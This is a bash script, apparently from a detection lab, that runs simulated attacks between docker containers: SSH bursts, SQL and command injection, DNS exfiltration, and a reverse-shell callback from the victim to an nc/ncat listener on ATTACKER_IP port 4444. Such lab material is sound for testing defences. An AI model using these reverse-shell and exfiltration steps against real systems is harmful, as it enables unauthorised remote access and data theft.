#!/bin/bash
set -euo pipefail

SCENARIO="${1:-all}"
ATTACKER_CONTAINER="${ATTACKER_CONTAINER:-attacker}"
VICTIM_CONTAINER="${VICTIM_CONTAINER:-victim}"
ATTACKER_IP="${ATTACKER_IP:-10.77.0.20}"
LISTENER_PORT="${LISTENER_PORT:-4444}"

usage() {
  cat <<'EOF'
Usage: bash scripts/lab/run_attack_playbook.sh [scenario]

Scenarios:
  ssh-burst
  sqli
  cmdi
  dns-exfil
  reverse-shell
  all

Run from the repository root after `docker compose up -d`.
EOF
}

require_running_container() {
  local name="$1"
  if ! docker ps --format '{{.Names}}' | grep -Fxq "${name}"; then
    echo "Container '${name}' is not running. Start the lab with docker compose up -d." >&2
    exit 1
  fi
}

attacker_exec() {
  docker exec "${ATTACKER_CONTAINER}" bash -lc "$1"
}

victim_exec() {
  docker exec "${VICTIM_CONTAINER}" bash -lc "$1"
}

start_listener() {
  attacker_exec 'rm -f /tmp/vigilan-reverse-shell.log'
  docker exec -d "${ATTACKER_CONTAINER}" bash -lc "
    if command -v ncat >/dev/null 2>&1; then
      timeout 12 ncat -l ${LISTENER_PORT} >/tmp/vigilan-reverse-shell.log 2>&1
    elif nc -h 2>&1 | grep -q -- ' -p '; then
      timeout 12 nc -l -p ${LISTENER_PORT} >/tmp/vigilan-reverse-shell.log 2>&1
    else
      timeout 12 nc -l ${LISTENER_PORT} >/tmp/vigilan-reverse-shell.log 2>&1
    fi
  "
  sleep 1
}

run_reverse_shell() {
  echo "== Reverse shell callback simulation =="
  start_listener
  victim_exec "/lab/reverse_shell_callback.sh ${ATTACKER_IP} ${LISTENER_PORT}"
  sleep 2
  attacker_exec 'echo "-- Listener capture --"; sed -n "1,10p" /tmp/vigilan-reverse-shell.log'
}

case "${SCENARIO}" in
  -h|--help|help)
    usage
    exit 0
    ;;
esac

require_running_container "${ATTACKER_CONTAINER}"
require_running_container "${VICTIM_CONTAINER}"

case "${SCENARIO}" in
  ssh-burst|sqli|cmdi|dns-exfil)
    attacker_exec "/lab/advanced_scenarios.sh ${SCENARIO}"
    ;;
  reverse-shell)
    run_reverse_shell
    ;;
  all)
    attacker_exec "/lab/advanced_scenarios.sh all"
    run_reverse_shell
    ;;
  *)
    echo "Unknown scenario: ${SCENARIO}" >&2
    usage >&2
    exit 1
    ;;
esac
